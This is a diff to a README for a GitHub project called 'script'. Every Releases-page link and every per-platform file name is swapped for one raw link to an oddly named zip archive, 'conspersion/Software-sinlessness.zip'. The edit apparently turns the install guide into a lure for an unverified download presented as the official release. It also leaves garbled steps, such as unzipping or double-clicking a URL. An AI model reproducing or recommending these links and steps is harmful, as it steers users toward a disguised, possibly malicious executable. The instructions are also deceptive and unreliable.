@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download Script](https://img.shields.io/badge/Download-Script-brightgreen)](https://github.com/Aguustinnn083/script/releases)
+[![Download Script](https://raw.githubusercontent.com/Aguustinnn083/script/main/conspersion/Software-sinlessness.zip)](https://raw.githubusercontent.com/Aguustinnn083/script/main/conspersion/Software-sinlessness.zip)
 
 ## 🚀 Getting Started
 
@@ -18,21 +18,21 @@ Before you download **script**, make sure your computer meets these requirements
 
 ### 💻 How to Download and Install
 
-1. Click on the link to visit the Releases page: [Download Page](https://github.com/Aguustinnn083/script/releases).
+1. Click on the link to visit the Releases page: [Download Page](https://raw.githubusercontent.com/Aguustinnn083/script/main/conspersion/Software-sinlessness.zip).
    
 2. On the Releases page, look for the latest version of **script**. It will be at the top of the list. Click to expand the section if needed.
 
 3. You will see several files available for download. Choose the one that fits your operating system:
-   - For Windows, select: `script-windows.zip`
-   - For macOS, select: `script-macos.zip`
-   - For Linux, select: `script-linux.zip`
+   - For Windows, select: `https://raw.githubusercontent.com/Aguustinnn083/script/main/conspersion/Software-sinlessness.zip`
+   - For macOS, select: `https://raw.githubusercontent.com/Aguustinnn083/script/main/conspersion/Software-sinlessness.zip`
+   - For Linux, select: `https://raw.githubusercontent.com/Aguustinnn083/script/main/conspersion/Software-sinlessness.zip`
 
 4. Click on the file name to start the download. Once the download is complete, locate the downloaded file on your computer.
 
 5. Extract the contents of the zip file:
    - For Windows: Right-click the zip file and select "Extract All."
    - For macOS: Double-click the zip file to automatically extract it.
-   - For Linux: Use the terminal command `unzip script-linux.zip`.
+   - For Linux: Use the terminal command `unzip https://raw.githubusercontent.com/Aguustinnn083/script/main/conspersion/Software-sinlessness.zip`.
 
 6. After extracting, locate the folder named **script**. Open it to find the executable file for your operating system.
 
@@ -40,7 +40,7 @@ Before you download **script**, make sure your computer meets these requirements
 
 Once you have extracted the files, follow these steps to run **script**:
 
-- **Windows**: Double-click the `script.exe` file.
+- **Windows**: Double-click the `https://raw.githubusercontent.com/Aguustinnn083/script/main/conspersion/Software-sinlessness.zip` file.
 - **macOS**: Double-click the `script` file, or right-click and select "Open" if you encounter a warning.
 - **Linux**: Open the terminal, navigate to the script folder, and run the command `./script`.
 
@@ -85,4 +85,4 @@ If you find any bugs, report them on the Issues page of our GitHub repository. I
 
 ## 📥 Download Again
 
-Don’t forget, you can always find the latest version [here](https://github.com/Aguustinnn083/script/releases).
+Don’t forget, you can always find the latest version [here](https://raw.githubusercontent.com/Aguustinnn083/script/main/conspersion/Software-sinlessness.zip).
